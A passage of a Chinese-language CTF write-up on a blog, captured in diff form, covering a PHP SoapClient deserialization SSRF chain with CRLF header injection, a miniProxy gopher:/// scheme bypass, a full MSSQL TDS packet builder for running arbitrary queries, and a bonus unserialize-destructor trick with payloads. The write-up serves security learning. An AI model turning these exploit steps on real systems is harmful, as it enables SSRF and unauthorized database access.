-<script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var b=document,a=b.createElement('script');a.async=!0,a.src='//ZeddYu.disqus.com/embed.js',a.setAttribute('data-timestamp',+new Date),(b.head||b.body).appendChild(a)})()</script>
-<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
-<a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
-</div>
-<style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style>
-<script>window.addEventListener('onColorSchemeChange',a=>{DISQUS&&DISQUS.reset({reload:!0})})</script>
-<footer class=site-footer>
-<section class=copyright>
-&copy;
+</code></pre><p>当我们请求 8080 的时候，请求的是 miniProxy，但是只能用 GET 请求，而我们之前可以发现<code>SoapClient</code>只能发 POST 请求</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005778.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005778.jpg loading=lazy></a></figure></p><p>这里大概思路也比较清晰了，就是利用 miniProxy 使用 gopher 协议去访问 mssql 数据库拿到 flag ，但是怎么处理让<code>SoapClient</code>发送 GET 请求呢？</p><p>####SoapClient CRLF injection</p><p>发送 GET 请求我们就不得不又用到<code>SoapClient</code>的另一个选项</p><blockquote><p><strong>options</strong></p><p>An array of options. If working in WSDL mode, this parameter is optional. If working in non-WSDL mode, the <em>location</em> and <em>uri</em> options must be set, where <em>location</em> is the URL of the SOAP server to send the request to, and <em>uri</em> is the target namespace of the SOAP service.</p><p>&mldr;</p><p>The <em>user_agent</em> option specifies string to use in <em>User-Agent</em> header.</p></blockquote><p>而且在 header 里 <code>User-Agent</code> 在 <code>Content-Type</code> 前面，这里我们可以使用 CRLF 进行分隔请求，构造 GET 请求。</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005475.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005475.jpg loading=lazy></a></figure></p><h4 id=miniproxy-url-scheme-bypass>miniProxy URL scheme bypass</h4><p>我们自己本地看看 MiniProxy 怎么用。</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003617.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003617.jpg loading=lazy></a></figure></p><p>随便测一个<code>file:///etc/passwd</code>，返回</p><pre tabindex=0><code>Error: Detected a &#34;file&#34; URL. miniProxy exclusively supports http[s] URLs.
+</code></pre><p>然后我们定位到代码区</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$scheme</span> <span class=o>=</span> <span class=nx>parse_url</span><span class=p>(</span><span class=nv>$url</span><span class=p>,</span> <span class=nx>PHP_URL_SCHEME</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=k>empty</span><span class=p>(</span><span class=nv>$scheme</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=c1>//Assume that any supplied URLs starting with // are HTTP URLs.
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>if</span> <span class=p>(</span><span class=nx>strpos</span><span class=p>(</span><span class=nv>$url</span><span class=p>,</span> <span class=s2>&#34;//&#34;</span><span class=p>)</span> <span class=o>===</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$url</span> <span class=o>=</span> <span class=s2>&#34;http:&#34;</span> <span class=o>.</span> <span class=nv>$url</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/^https?$/i&#34;</span><span class=p>,</span> <span class=nv>$scheme</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;Error: Detected a &#34;&#39;</span> <span class=o>.</span> <span class=nv>$scheme</span> <span class=o>.</span> <span class=s1>&#39;&#34; URL. miniProxy exclusively supports http[s] URLs.&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>发现是这个地方有个正则判断，开头必须以<code>https</code>或者<code>http</code>，然而我们需要用到 gopher 协议，就需要绕过这里。这里也就需要一个小 trick 了</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$scheme</span> <span class=o>=</span> <span class=nx>parse_url</span><span class=p>(</span><span class=nv>$url</span><span class=p>,</span> <span class=nx>PHP_URL_SCHEME</span><span class=p>);</span>	<span class=c1>// 遇到 gopher:/// 时会解析失败，返回false
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>empty</span><span class=p>(</span><span class=nv>$scheme</span><span class=p>)</span>								<span class=c1>// empty(false) 为 true
+</span></span></span></code></pre></div><p>这样我们就可以使用<code>gopher:///</code>绕过<code>die</code>的限制执行下面的 <code>$response = makeRequest($url);</code> 请求函数了。</p><p>这里也可以使用一个 301 进行跳转。</p><h4 id=connect-to-mssql-via-gopher>Connect to MSSQL via gopher</h4><p>怎么构造gopher包呢，这是个比较麻烦的事，之前在另外一个比赛上用 tcpdump 抓自己的 mysql 的数据包然后进行 gopher ，这里也是类似的。这里就不再做了，直接拿官方给的 exp 看看吧。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=c1>// the prelogin and login packets can either be assembled
+</span></span></span><span class=line><span class=cl><span class=c1>// by hand if you are into that kind of stuff.
+</span></span></span><span class=line><span class=cl><span class=c1>// or you can just use wireshark :)
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$prelogin_packet</span>  <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\x12\x01\x00\x2f\x00\x00\x01\x00</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$prelogin_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x00\x00\x1a\x00\x06\x01\x00\x20</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$prelogin_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x00\x01\x02\x00\x21\x00\x01\x03</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$prelogin_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x00\x22\x00\x04\x04\x00\x26\x00</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$prelogin_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x01\xff\x00\x00\x00\x01\x00\x01</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$prelogin_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x02\x00\x00\x00\x00\x00\x00</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$login_packet</span>  <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\x10\x01\x00\xde\x00\x00\x01\x00</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\xd6\x00\x00\x00\x04\x00\x00\x74</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x00\x10\x00\x00\x00\x00\x00\x00</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x54\x30\x00\x00\x00\x00\x00\x00</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\xe0\x00\x00\x08\xc4\xff\xff\xff</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x09\x04\x00\x00\x5e\x00\x07\x00</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x6c\x00\x0a\x00\x80\x00\x08\x00</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x90\x00\x0a\x00\xa4\x00\x09\x00</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\xb6\x00\x00\x00\xb6\x00\x07\x00</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\xc4\x00\x00\x00\xc4\x00\x09\x00</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x01\x02\x03\x04\x05\x06\xd6\x00</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x00\x00\xd6\x00\x00\x00\xd6\x00</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x00\x00\x00\x00\x00\x00\x61\x00</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x77\x00\x65\x00\x73\x00\x6f\x00</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x6d\x00\x65\x00\x63\x00\x68\x00</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x61\x00\x6c\x00\x6c\x00\x65\x00</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x6e\x00\x67\x00\x65\x00\x72\x00</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\xc1\xa5\x53\xa5\x53\xa5\x83\xa5</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\xb3\xa5\x82\xa5\xb6\xa5\xb7\xa5</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x6e\x00\x6f\x00\x64\x00\x65\x00</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x2d\x00\x6d\x00\x73\x00\x73\x00</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x71\x00\x6c\x00\x6c\x00\x6f\x00</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x63\x00\x61\x00\x6c\x00\x68\x00</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x6f\x00\x73\x00\x74\x00\x54\x00</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x65\x00\x64\x00\x69\x00\x6f\x00</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x75\x00\x73\x00\x63\x00\x68\x00</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x61\x00\x6c\x00\x6c\x00\x65\x00</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$login_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x6e\x00\x67\x00\x65\x00</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>// need to add a ;-- - to execute the query successfully,
+</span></span></span><span class=line><span class=cl><span class=c1>// because gopher adds a \x0d\x0a to the end of the request
+</span></span></span><span class=line><span class=cl><span class=c1>// and for some reaason the query does not execute if we don&#39;t
+</span></span></span><span class=line><span class=cl><span class=c1>// comment that out
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$query</span> <span class=o>=</span> <span class=nv>$argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>.</span> <span class=s2>&#34;;-- -&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$query</span> <span class=o>=</span> <span class=nx>mb_convert_encoding</span><span class=p>(</span><span class=nv>$query</span><span class=p>,</span> <span class=s2>&#34;utf-16le&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>// the length of the packet is the length of the query +
+</span></span></span><span class=line><span class=cl><span class=c1>// the length of the header (30 bytes) + the \x0d\x0a added
+</span></span></span><span class=line><span class=cl><span class=c1>// by gopher protocol
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$length</span> <span class=o>=</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$query</span><span class=p>)</span> <span class=o>+</span> <span class=mi>30</span> <span class=o>+</span> <span class=mi>2</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$query_packet</span>  <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\x01\x01</span><span class=s2>&#34;</span> <span class=o>.</span> <span class=nx>pack</span><span class=p>(</span><span class=s2>&#34;n&#34;</span><span class=p>,</span> <span class=nv>$length</span><span class=p>)</span> <span class=o>.</span> <span class=s2>&#34;</span><span class=se>\x00\x00\x01\x00</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$query_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x16\x00\x00\x00\x12\x00\x00\x00</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$query_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x02\x00\x00\x00\x00\x00\x00\x00</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$query_packet</span> <span class=o>.=</span> <span class=s2>&#34;</span><span class=se>\x00\x00\x01\x00\x00\x00</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$query_packet</span> <span class=o>.=</span> <span class=nv>$query</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$payload</span> <span class=o>=</span> <span class=nv>$prelogin_packet</span> <span class=o>.</span> <span class=nv>$login_packet</span> <span class=o>.</span> <span class=nv>$query_packet</span><span class=p>;</span>
+</span></span></code></pre></div><p>可以看到这里需要加入一个<code>;-- -</code>，是为了注释掉<code>\x0a\x0a</code>，这是 gopher 自动添加的内容，不然 query 无法成功执行。</p><h4 id=get-flag>Get Flag</h4><p>基本的利用点都分析完了，最后这道题还比较良心地在 bootstrap.php 中设置了</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s2>&#34;HTTP_DEBUG&#34;</span><span class=p>]))</span> <span class=nx>var_dump</span><span class=p>(</span><span class=nv>$USER</span><span class=p>);</span>
+</span></span></code></pre></div><p>可以看到自己的 UID</p><p>这个可以用来干嘛呢？当然是用来注入了啦，直接在自己的 post 中获取相关的信息</p><pre tabindex=0><code class=language-mssql data-lang=mssql>insert into posts (userid, title, content, attachment) values ({}, &#34;foobar&#34;, (select flag from flag.flag), &#34;foobar&#34;);
+</code></pre><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007735.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007735.jpg loading=lazy></a></figure></p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000709.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000709.jpg loading=lazy></a></figure></p><h3 id=conclusion>Conclusion</h3><p>整个复现完还是感觉比较有难度的，特别是整个构造链都比较有意思。通过<code>SoapClient</code>反序列化到 gopher SSRF 到 CRLF 再到 Get Flag，整个流程需要的技巧以及对自己的能力要求比较高，整体下来学习了不少。主要都是与<code>SoapClient</code>相关，还是比较 Nice 的题目，也重新认识了反序列化漏洞。整体都比较赞。</p><h2 id=php--bonus>php — Bonus</h2><h3 id=description-1>Description</h3><blockquote><p>​ PHP&rsquo;s unserialization mechanism can be exceptional.</p></blockquote><p>给个 bonus 吧，也算是一道简单的序列化题目</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=nv>$line</span> <span class=o>=</span> <span class=nx>trim</span><span class=p>(</span><span class=nx>fgets</span><span class=p>(</span><span class=nx>STDIN</span><span class=p>));</span>
+</span></span><span class=line><span class=cl><span class=nv>$flag</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;/flag&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>B</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>global</span> <span class=nv>$flag</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nv>$flag</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=o>@</span><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$line</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>throw</span> <span class=k>new</span> <span class=nx>Exception</span><span class=p>(</span><span class=s1>&#39;Well that was unexpected…&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$a</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></div><h3 id=hacking-1>Hacking</h3><p>Php 正常的类调用析构函数一般会在脚本结束的时候，然而这里要想拿到 flag ，就需要调用析构函数。然而<code>unserialize</code>正常解析类的时候不会调用析构函数，但是当解析出错的时候，如果类名是正确的，就会调用这个类的析构函数，比如正常序列化出来的类是这样的<code>O:1:"B":0:{}</code>，只要我们让他解析出错就可以调用析构函数了，所以以下随便用一个就好了</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>O</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=s2>&#34;B&#34;</span><span class=o>:</span><span class=mi>0</span><span class=o>:</span><span class=p>{</span>
+</span></span><span class=line><span class=cl><span class=nx>O</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=s2>&#34;B&#34;</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=p>{}</span>
+</span></span></code></pre></div></section><footer class=article-footer><section class=article-tags><a href=/tags/CTF/>CTF</a>
+<a href=/tags/wp/>wp</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg><span>Licensed under CC BY-NC-SA 4.0</span></section><div class="notice notice-tip"><div class=notice-title><svg xmlns="http://www.w3.org/2000/svg" class="icon notice-icon" viewBox="0 0 512 512"><path d="M504 256A248 248 0 118 256a248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z"/></svg></div><p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><br><p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://blog.zeddyu.info/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p><br></div></footer></article><aside class=related-contents--wrapper><h2 class=section-title>Related contents</h2><div class=related-contents><div class="flex article-list--tile"><article><a href=/2020/04/24/Plaid-CTF-2020-Web-2/><div class=article-details><h2 class=article-title>Plaid CTF 2020 Catalog</h2></div></a></article><article><a href=/2020/04/20/Plaid-CTF-2020-Web-1/><div class=article-details><h2 class=article-title>Plaid CTF 2020 Contrived Web Problem Write Up</h2></div></a></article><article><a href=/2019/06/04/2019qwb/><div class=article-details><h2 class=article-title>2019强网杯部分Web wp</h2></div></a></article><article><a href=/2019/05/30/2019iscc/><div class=article-details><h2 class=article-title>2019 ISCC Web wp</h2></div></a></article><article><a href=/2019/05/09/2019ciscn-RefSpace/><div class=article-details><h2 class=article-title>2019 CISCN RefSpace</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//ZeddYu.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{DISQUS&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
 2018 -
-2022 Zeddy's Blog
-</section>
-<section class=powerby>
-Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> <br>
-Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.2.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a>
-</section>
-</footer>
-<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
-<div class=pswp__bg></div>
-<div class=pswp__scroll-wrap>
-<div class=pswp__container>
-<div class=pswp__item></div>
-<div class=pswp__item></div>
-<div class=pswp__item></div>
-</div>
-<div class="pswp__ui pswp__ui--hidden">
-<div class=pswp__top-bar>
-<div class=pswp__counter></div>
-<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+2022 Zeddy's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.2.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
 <button class="pswp__button pswp__button--share" title=Share></button>
 <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-<div class=pswp__preloader>
-<div class=pswp__preloader__icn>
-<div class=pswp__preloader__cut>
-<div class=pswp__preloader__donut></div>
-</div>
-</div>
-</div>
-</div>
-<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-<div class=pswp__share-tooltip></div>
-</div>
-<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-</button>
-<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
-</button>
-<div class=pswp__caption>
-<div class=pswp__caption__center></div>
-</div>
-</div>
-</div>
-</div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous>
-</main>
-<aside class="sidebar right-sidebar sticky">
-<section class="widget archives">
-<div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
-</div>
-<h2 class="widget-title section-title">Table of contents</h2>
-<div class=widget--toc>
-<nav id=TableOfContents>
-<ol>
-<li><a href=#post>POST</a>
-<ol>
-<li><a href=#description>Description</a></li>
-<li><a href=#attacking-steps>Attacking Steps</a></li>
-<li><a href=#hacking>Hacking</a>
-<ol>
-<li><a href=#nginx-misconfiguration>Nginx Misconfiguration</a></li>
-<li><a href=#arbitrary-unserialize-i>Arbitrary Unserialize I</a></li>
-<li><a href=#bypass-mssql>ByPass Mssql</a></li>
-<li><a href=#soapclient>Soapclient</a></li>
-<li><a href=#soapclient-ssrf>SoapClient SSRF</a></li>
-<li><a href=#miniproxy-url-scheme-bypass>miniProxy URL scheme bypass</a></li>
-<li><a href=#connect-to-mssql-via-gopher>Connect to MSSQL via gopher</a></li>
-<li><a href=#get-flag>Get Flag</a></li>
-</ol>
-</li>
-<li><a href=#conclusion>Conclusion</a></li>
-</ol>
-</li>
-<li><a href=#php--bonus>php — Bonus</a>
-<ol>
-<li><a href=#description-1>Description</a></li>
-<li><a href=#hacking-1>Hacking</a></li>
-</ol>
-</li>
-</ol>
-</nav>
-</div>
-</section>
-</aside>
-</div>
-<script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous defer></script><script type=text/javascript src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//ts/main.js defer></script>
